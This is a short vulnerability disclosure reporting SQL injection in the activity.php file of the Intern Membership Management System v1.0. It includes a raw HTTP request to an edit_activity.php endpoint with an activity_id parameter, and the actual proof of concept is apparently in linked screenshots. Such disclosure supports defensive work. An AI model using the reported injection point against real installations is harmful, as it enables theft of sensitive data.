#  Intern Membership Management System activity.php sql injection

## NAME OF AFFECTED PRODUCT(S)

Intern Membership Management System

## Vendor Homepage

https://code-projects.org/intern-membership-management-system-in-php-with-source-code/

## Vulnerable File

activity.php

## VERSION(S)

v1.0

## Vulnerability Type

SQL injection

## DESCRIPTION

There is a SQL injection vulnerability in the activity.php file of the Intern Membership Management System project, which can be exploited by attackers to obtain sensitive data information

## Vulnerability details and POC

![image-20260107001930612](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/Intern-Membership-Management-System/image-20260107001930612.9kgnxdbz9w.webp)

![image-20260107001939696](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/Intern-Membership-Management-System/image-20260107001939696.4g4z83c21f.webp)

Data packet：

```
GET /intern/admin/edit_activity.php?activity_id=1 HTTP/1.1
Host: localhost
sec-ch-ua: "Not_A Brand";v="99", "Chromium";v="142"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/intern/admin/activity.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=67l3m5trr6l48dkoe6lsb3g72i
Connection: keep-alive
```

![image-20260107001954385](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/Intern-Membership-Management-System/image-20260107001954385.1aph95hn4i.webp)
